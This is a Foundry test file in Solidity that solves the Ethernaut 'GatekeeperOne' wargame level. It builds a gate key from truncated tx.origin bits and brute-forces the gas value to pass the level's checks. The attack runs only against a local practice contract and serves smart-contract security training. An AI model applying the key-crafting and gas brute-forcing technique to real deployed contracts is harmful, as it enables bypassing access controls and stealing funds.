pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { GatekeeperOne } from "src/GatekeeperOne/GatekeeperOne.sol";
import { GatekeeperOneFactory } from "src/GatekeeperOne/GatekeeperOneFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

contract GatekeeperOneExploit {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack(bytes8 key, uint256 gasUsed) external {
        (bool success, ) = victim.call{ gas: gasUsed }(abi.encodeWithSignature("enter(bytes8)", key));
        require(success);
    }

    function checkGate3Requirement(bytes8 _gateKey, uint16 requirement) public pure returns (bool) {
        return uint32(uint64(_gateKey)) == requirement;
    }

    function checkGate2Requirement(bytes8 _gateKey) public pure returns (bool) {
        return uint32(uint64(_gateKey)) != uint64(_gateKey); 
    }

    function checkGate1Requirement(bytes8 _gateKey) public pure returns (bool) {
        return uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));
    }
}

contract GatekeeperOneTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");
    
    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testGatekeeperOneHack() external {
        // level setup
        GatekeeperOneFactory factory = new GatekeeperOneFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(factory);
        GatekeeperOne gateKeeper = GatekeeperOne(payable(levelAddress));
        vm.stopPrank();

        // attack
        GatekeeperOneExploit exploit = new GatekeeperOneExploit(address(gateKeeper));
        // we start at gate 3 -> 2 -> 1requirements
        // get 16 bits least significant bit of tx origin
        uint16 txOrigin = uint16(uint160(tx.origin));

        // to compose full key which is bytes8
        bytes4 halfKey = bytes4(bytes.concat(bytes2(uint16(0)), bytes2(txOrigin)));
        bytes8 gateKey = bytes8(bytes.concat(halfKey, halfKey));

        assert(exploit.checkGate3Requirement(gateKey, txOrigin));
        assert(exploit.checkGate2Requirement(gateKey));
        assert(exploit.checkGate1Requirement(gateKey));
        
        for (uint256 i = 0; i <= 8191; i++) {
            try exploit.attack(gateKey, i+50000) {
                console2.log("Success - gas used = %s", i+50000);
                break;
            } catch {
                // console2.log("Failed - gas used = %s", i);
            }
        }
        
        // submission
        vm.startPrank(tx.origin);
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}

